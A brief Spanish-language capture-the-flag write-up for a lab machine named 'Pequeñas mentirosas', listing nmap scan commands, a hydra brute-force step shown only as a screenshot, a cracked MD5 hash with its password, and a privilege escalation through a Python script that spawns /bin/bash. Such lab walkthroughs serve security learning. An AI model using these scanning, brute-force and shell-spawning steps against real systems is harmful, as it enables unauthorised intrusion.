# Maquina Pequeñas mentirosas

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

## Entrando a la Web

![alt text](image-2.png)

## Ataque con hydra

![alt text](image-3.png)

## Intrusion

Con las credenciales encontradas iniciamos sesión

![alt text](image-4.png)

ver usuarios:

![alt text](image-5.png)

en la ruta: srv/ftp

cat hash_spencer.txt
7c6a180b36896a0a8c02787eeafb0e4c

utilizando crackstation:

![alt text](image-6.png)

password1

Cambiamos al usuario spencer

## Escalar privilegios

![alt text](image-7.png)

hacemos:

echo "import os
os.system('/bin/bash')" > script.py

![alt text](image-8.png)


